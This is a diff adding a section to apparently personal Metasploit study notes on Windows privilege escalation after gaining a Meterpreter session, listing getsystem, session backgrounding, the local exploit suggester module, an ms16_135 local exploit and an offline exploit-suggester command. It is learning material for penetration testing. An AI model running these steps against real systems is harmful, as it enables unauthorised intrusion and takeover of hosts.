@@ -194,3 +194,50 @@ meterpreter > help               # Now shows new commands
 
 ---
 ---
+# Post-Exploitation: Privilege Escalation in Metasploit
+
+## After Getting a Meterpreter Session
+
+### 1. **Try Automatic Elevation**
+```msf
+meterpreter > getsystem
+```
+- Attempts built-in techniques (e.g., named pipe impersonation, token duplication)
+- **Often fails** on modern Windows due to patches/UAC
+- If successful → `NT AUTHORITY\SYSTEM`
+
+---
+### 2. **Background the Session**
+```msf
+meterpreter > background
+```
+- **NOT `Ctrl+C`** → that **kills** the session  
+- **`background`** (or `Ctrl+Z` → then `y`) → keeps session alive with an ID (e.g., **Session 3**)
+
+> ✅ Use `sessions` to list all active sessions  
+> ✅ Use `sessions -i 3` to reattach
+
+---
+### 3. **Run Local Exploit Suggester**
+Automatically identifies missing patches and available local exploits:
+
+```msf
+msf6 > search local_exploit_suggester
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 > set SESSION 3
+msf6 > run
+```
+
+---
+## Next Steps
+
+- Manually run suggested exploit (e.g., `use exploit/windows/local/ms16_135`)
+- Or use **Windows Exploit Suggester** offline for more accuracy:
+  ```bash
+  ./windows-exploit-suggester.py --database mssb.xlsx --systeminfo target.txt (all pasted from meterpreter sysinfo)
+  ```
+
+> ⚠️ **Kernel exploits may crash the system** — use only when necessary and in controlled labs.
+
+---
+---
